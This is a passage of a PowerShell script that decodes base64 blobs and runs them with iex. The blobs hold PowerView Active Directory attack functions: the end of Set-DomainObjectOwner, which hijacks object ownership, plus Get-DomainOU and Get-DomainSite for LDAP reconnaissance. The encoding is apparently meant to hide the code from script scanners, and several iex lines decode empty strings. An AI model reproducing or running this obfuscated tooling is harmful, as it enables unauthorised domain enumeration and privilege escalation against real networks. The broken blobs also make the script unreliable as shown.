JzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgJE93bmVyU2lkID0gR2V0LURvbWFpbk9iamVjdCBAU2VhcmNoZXJBcmd1bWVudHMgLUlkZW50aXR5ICRPd25lcklkZW50aXR5IC1Qcm9wZXJ0aWVzIG9iamVjdHNpZCB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IG9iamVjdHNpZAogICAgICAgIGlmICgkT3duZXJTaWQpIHsKICAgICAgICAgICAgJE93bmVySWRlbnRpdHlSZWZlcmVuY2UgPSBbU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5TZWN1cml0eUlkZW50aWZpZXJdJE93bmVyU2lkCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbU2V0LURvbWFpbk9iamVjdE93bmVyXSBFcnJvciBwYXJzaW5nIG93bmVyIGlkZW50aXR5ICckT3duZXJJZGVudGl0eSciCiAgICAgICAgfQogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRPd25lcklkZW50aXR5UmVmZXJlbmNlKSB7CiAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snUmF3J10gPSAkVHJ1ZQogICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkSWRlbnRpdHkKICAgICAgICAgICAgJFJhd09iamVjdCA9IEdldC1Eb21haW5PYmplY3QgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgIEZvckVhY2ggKCRPYmplY3QgaW4gJFJhd09iamVjdCkgewogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbU2V0LURvbWFpbk9iamVjdE93bmVyXSBBdHRlbXB0aW5nIHRvIHNldCB0aGUgb3duZXIgZm9yICckSWRlbnRpdHknIHRvICckT3duZXJJZGVudGl0eSciCiAgICAgICAgICAgICAgICAgICAgJEVudHJ5ID0gJFJhd09iamVjdC5HZXREaXJlY3RvcnlFbnRyeSgpCiAgICAgICAgICAgICAgICAgICAgJEVudHJ5LlBzQmFzZS5PcHRpb25zLlNlY3VyaXR5TWFza3MgPSAnT3duZXInCiAgICAgICAgICAgICAgICAgICAgJEVudHJ5LlBzQmFzZS5PYmplY3RTZWN1cml0eS5TZXRPd25lcigkT3duZXJJZGVudGl0eVJlZmVyZW5jZSkKICAgICAgICAgICAgICAgICAgICAkRW50cnkuUHNCYXNlLkNvbW1pdENoYW5nZXMoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltTZXQtRG9tYWluT2JqZWN0T3duZXJdIEVycm9yIHNldHRpbmcgb3duZXI6ICRfIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbk9VIHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3Lk9VJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkSWRlbnRpdHksCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgIFtBbGlhcygnR1VJRCcpXQogICAgICAgICRHUExpbmssCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0ZpbHRlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJExEQVBGaWx0ZXIsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFByb3BlcnRpZXMsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdEYWNsJywgJ0dyb3VwJywgJ05vbmUnLCAnT3duZXInLCAnU2FjbCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlY3VyaXR5TWFza3MsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAogICAgICAgIFtBbGlhcygnUmV0dXJuT25lJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRmluZE9uZSwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUmF3CiAgICApCiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb3BlcnRpZXMnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Byb3BlcnRpZXMnXSA9ICRQcm9wZXJ0aWVzIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlY3VyaXR5TWFza3MnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlY3VyaXR5TWFza3MnXSA9ICRTZWN1cml0eU1hc2tzIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICRPVVNlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIEBTZWFyY2hlckFyZ3VtZW50cwogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRPVVNlYXJjaGVyKSB7CiAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciA9ICcnCiAgICAgICAgICAgICRGaWx0ZXIgPSAnJwogICAgICAgICAgICAkSWRlbnRpdHkgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICRJZGVudGl0eUluc3RhbmNlID0gJF8uUmVwbGFjZSgnKCcsICdcMjgnKS5SZXBsYWNlKCcpJywgJ1wyOScpCiAgICAgICAgICAgICAgICBpZiAoJElkZW50aXR5SW5zdGFuY2UgLW1hdGNoICdeT1U9LionKSB7CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoZGlzdGluZ3Vpc2hlZG5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgIGlmICgoLW5vdCAkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSAtYW5kICgtbm90ICRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlEb21haW4gPSAkSWRlbnRpdHlJbnN0YW5jZS5TdWJTdHJpbmcoJElkZW50aXR5SW5zdGFuY2UuSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5PVV0gRXh0cmFjdGVkIGRvbWFpbiAnJElkZW50aXR5RG9tYWluJyBmcm9tICckSWRlbnRpdHlJbnN0YW5jZSciCiAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkSWRlbnRpdHlEb21haW4KICAgICAgICAgICAgICAgICAgICAgICAgJE9VU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgtbm90ICRPVVNlYXJjaGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LURvbWFpbk9VXSBVbmFibGUgdG8gcmV0cmlldmUgZG9tYWluIHNlYXJjaGVyIGZvciAnJElkZW50aXR5RG9tYWluJyIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRHdWlkQnl0ZVN0cmluZyA9ICgtSm9pbiAoKFtHdWlkXSRJZGVudGl0eUluc3RhbmNlKS5Ub0J5dGVBcnJheSgpIHwgRm9yRWFjaC1PYmplY3QgeyRfLlRvU3RyaW5nKCdYJykuUGFkTGVmdCgyLCcwJyl9KSkgLVJlcGxhY2UgJyguLiknLCdcJDEnCiAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKSIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihuYW1lPSRJZGVudGl0eUluc3RhbmNlKSIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRJZGVudGl0eUZpbHRlciAtYW5kICgkSWRlbnRpdHlGaWx0ZXIuVHJpbSgpIC1uZSAnJykgKSB7CiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIofCRJZGVudGl0eUZpbHRlcikiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snR1BMaW5rJ10pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluT1VdIFNlYXJjaGluZyBmb3IgT1VzIHdpdGggJEdQTGluayBzZXQgaW4gdGhlIGdwTGluayBwcm9wZXJ0eSIKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIihncGxpbms9KiRHUExpbmsqKSIKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluT1VdIFVzaW5nIGFkZGl0aW9uYWwgTERBUCBmaWx0ZXI6ICRMREFQRmlsdGVyIgogICAgICAgICAgICAgICAgJEZpbHRlciArPSAiJExEQVBGaWx0ZXIiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJE9VU2VhcmNoZXIuZmlsdGVyID0gIigmKG9iamVjdENhdGVnb3J5PW9yZ2FuaXphdGlvbmFsVW5pdCkkRmlsdGVyKSIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5PVV0gR2V0LURvbWFpbk9VIGZpbHRlciBzdHJpbmc6ICQoJE9VU2VhcmNoZXIuZmlsdGVyKSIKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRmluZE9uZSddKSB7ICRSZXN1bHRzID0gJE9VU2VhcmNoZXIuRmluZE9uZSgpIH0KICAgICAgICAgICAgZWxzZSB7ICRSZXN1bHRzID0gJE9VU2VhcmNoZXIuRmluZEFsbCgpIH0KICAgICAgICAgICAgJFJlc3VsdHMgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1JhdyddKSB7CiAgICAgICAgICAgICAgICAgICAgJE9VID0gJF8KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRPVSA9IENvbnZlcnQtTERBUFByb3BlcnR5IC1Qcm9wZXJ0aWVzICRfLlByb3BlcnRpZXMKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRPVS5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuT1UnKQogICAgICAgICAgICAgICAgJE9VCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRSZXN1bHRzKSB7CiAgICAgICAgICAgICAgICB0cnkgeyAkUmVzdWx0cy5kaXNwb3NlKCkgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluT1VdIEVycm9yIGRpc3Bvc2luZyBvZiB0aGUgUmVzdWx0cyBvYmplY3Q6ICRfIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgICRPVVNlYXJjaGVyLmRpc3Bvc2UoKQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpblNpdGUgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuU2l0ZScpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ05hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJElkZW50aXR5LAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICBbQWxpYXMoJ0dVSUQnKV0KICAgICAgICAkR1BMaW5rLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRQcm9wZXJ0aWVzLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAogICAgICAgIFtWYWxpZGF0ZVNldCgnRGFjbCcsICdHcm91cCcsICdOb25lJywgJ093bmVyJywgJ1NhY2wnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWN1cml0eU1hc2tzLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKICAgICAgICBbQWxpYXMoJ1JldHVybk9uZScpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEZpbmRPbmUsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFJhdwogICAgKQogICAgQkVHSU4gewogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdTZWFyY2hCYXNlUHJlZml4JyA9ICdDTj1TaXRlcyxDTj1Db25maWd1cmF0aW9uJwogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUHJvcGVydGllcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddID0gJFByb3BlcnRpZXMgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VjdXJpdHlNYXNrcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VjdXJpdHlNYXNrcyddID0gJFNlY3VyaXR5TWFza3MgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgJFNpdGVTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIGlmICgkU2l0ZVNlYXJjaGVyKSB7CiAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciA9ICcnCiAgICAgICAgICAgICRGaWx0ZXIgPSAnJwogICAgICAgICAgICAkSWRlbnRpdHkgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICRJZGVudGl0eUluc3RhbmNlID0gJF8uUmVwbGFjZSgnKCcsICdcMjgnKS5SZXBsYWNlKCcpJywgJ1wyOScpCiAgICAgICAgICAgICAgICBpZiAoJElkZW50aXR5SW5zdGFuY2UgLW1hdGNoICdeQ049LionKSB7CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoZGlzdGluZ3Vpc2hlZG5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgIGlmICgoLW5vdCAkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSAtYW5kICgtbm90ICRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlEb21haW4gPSAkSWRlbnRpdHlJbnN0YW5jZS5TdWJTdHJpbmcoJElkZW50aXR5SW5zdGFuY2UuSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5TaXRlXSBFeHRyYWN0ZWQgZG9tYWluICckSWRlbnRpdHlEb21haW4nIGZyb20gJyRJZGVudGl0eUluc3RhbmNlJyIKICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRJZGVudGl0eURvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICAkU2l0ZVNlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIEBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoLW5vdCAkU2l0ZVNlYXJjaGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LURvbWFpblNpdGVdIFVuYWJsZSB0byByZXRyaWV2ZSBkb21haW4gc2VhcmNoZXIgZm9yICckSWRlbnRpdHlEb21haW4nIgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgJEd1aWRCeXRlU3RyaW5nID0gKC1Kb2luICgoW0d1aWRdJElkZW50aXR5SW5zdGFuY2UpLlRvQnl0ZUFycmF5KCkgfCBGb3JFYWNoLU9iamVjdCB7JF8uVG9TdHJpbmcoJ1gnKS5QYWRMZWZ0KDIsJzAnKX0pKSAtUmVwbGFjZSAnKC4uKScsJ1wkMScKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIob2JqZWN0Z3VpZD0kR3VpZEJ5dGVTdHJpbmcpIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKG5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJElkZW50aXR5RmlsdGVyIC1hbmQgKCRJZGVudGl0eUZpbHRlci5UcmltKCkgLW5lICcnKSApIHsKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIih8JElkZW50aXR5RmlsdGVyKSIKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydHUExpbmsnXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5TaXRlXSBTZWFyY2hpbmcgZm9yIHNpdGVzIHdpdGggJEdQTGluayBzZXQgaW4gdGhlIGdwTGluayBwcm9wZXJ0eSIKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIihncGxpbms9KiRHUExpbmsqKSIKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluU2l0ZV0gVXNpbmcgYWRkaXRpb25hbCBMREFQIGZpbHRlcjogJExEQVBGaWx0ZXIiCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIkTERBUEZpbHRlciIKICAgICAgICAgICAgfQogICAgICAgICAgICAkU2l0ZVNlYXJjaGVyLmZpbHRlciA9ICIoJihvYmplY3RDYXRlZ29yeT1zaXRlKSRGaWx0ZXIpIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblNpdGVdIEdldC1Eb21haW5TaXRlIGZpbHRlciBzdHJpbmc6ICQoJFNpdGVTZWFyY2hlci5maWx0ZXIpIgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydGaW5kT25lJ10pIHsgJFJlc3VsdHMgPSAkU2l0ZVNlYXJjaGVyLkZpbmRBbGwoKSB9CiAgICAgICAgICAgIGVsc2UgeyAkUmVzdWx0cyA9ICRTaXRlU2VhcmNoZXIuRmluZEFsbCgpIH0KICAgICAgICAgICAgJFJlc3VsdHMgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIGlmICgkUFN